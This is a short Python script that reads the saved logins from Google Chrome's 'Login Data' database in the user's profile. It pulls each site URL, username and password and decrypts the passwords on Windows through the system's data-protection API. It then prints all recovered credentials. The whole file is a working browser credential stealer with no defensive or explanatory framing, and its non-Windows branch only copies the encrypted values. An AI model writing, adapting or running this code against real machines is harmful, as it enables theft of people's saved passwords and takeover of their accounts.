import os
import sqlite3
import win32crypt  # pypiwin32
import sys

# path to user's login data
path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default"
print(path)
login_db = os.path.join(path, 'Login Data')

info_list = []
try:
	connection = sqlite3.connect(login_db, timeout = 10)
	with connection:
		cursor = connection.cursor()
		v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
		value = v.fetchall()

	if (os.name == "posix") and (sys.platform == "darwin"):
		print("Mac OSX not supported.")
		sys.exit(0)

	for information in value:
		if os.name == 'nt':
			password = win32crypt.CryptUnprotectData(
				information[2], None, None, None, 0)[1]
			if password:
				info_list.append({
					'origin_url': information[0],
					'username': information[1],
					'password': str(password)
				})

		elif os.name == 'posix':
			info_list.append({
				'origin_url': information[0],
				'username': information[1],
				'password': information[2]
			})

except sqlite3.OperationalError as e:
	e = str(e)
	if (e == 'database is locked'):
		print('[!] Make sure Google Chrome is not running in the background')
		sys.exit(0)
	elif (e == 'no such table: logins'):
		print('[!] Something wrong with the database name')
		sys.exit(0)
	elif (e == 'unable to open database file'):
		print('[!] Something wrong with the database path')
		sys.exit(0)
	else:
		print(e)
		sys.exit(0)

for element in info_list:
	print(element)
